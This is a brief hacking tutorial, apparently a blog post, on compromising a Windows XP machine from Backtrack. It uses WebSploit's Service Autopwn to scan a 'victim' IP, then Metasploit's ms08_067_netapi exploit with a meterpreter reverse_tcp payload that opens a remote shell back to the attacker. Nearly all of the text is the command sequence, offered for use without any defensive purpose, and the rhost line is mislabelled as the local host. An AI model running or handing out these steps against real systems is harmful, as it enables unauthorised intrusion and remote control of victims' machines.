Hacking Windows XP with WebSploit

First Install Websploit Toolkit in Backtrack
You can view the Tutorial Here
Open Your Backtrack terminal and Type cd  /pentest/web/websploit
Now open WebSploit Toolkit (SET)  ./websploit

Now choose option 3 “Automatic Exploiter”

Now choose option 1 “Service Autopwn”
wsf: Autopwn > Enter Target IP Address: 192.168.1.56 (IP Address of Victim)

The results above are showing that the port 445 is open so we will try to use the netapi exploit.
The microsoft-ds are a very common service in Windows machines. Most of the servers will have this service enabled so it will be very easy to exploit them except if they are using a firewall that filters the port 445.

Now Type “Search netapi” command in the console, this command will search for all the exploit modules with the pattern “netapi“

Now type use exploit/windows/smb/ms08_067_netapi
Msf exploit (ms08_067_netapi)>set payload windows/meterpreter/reverse_tcp
Msf exploit (ms08_067_netapi)>set lhost 192.168.1.3 (IP of Local Host)
Msf exploit (ms08_067_netapi)>set rhost 192.168.1.56 (IP of Local Host)
Msf exploit (ms08_067_netapi)>exploit
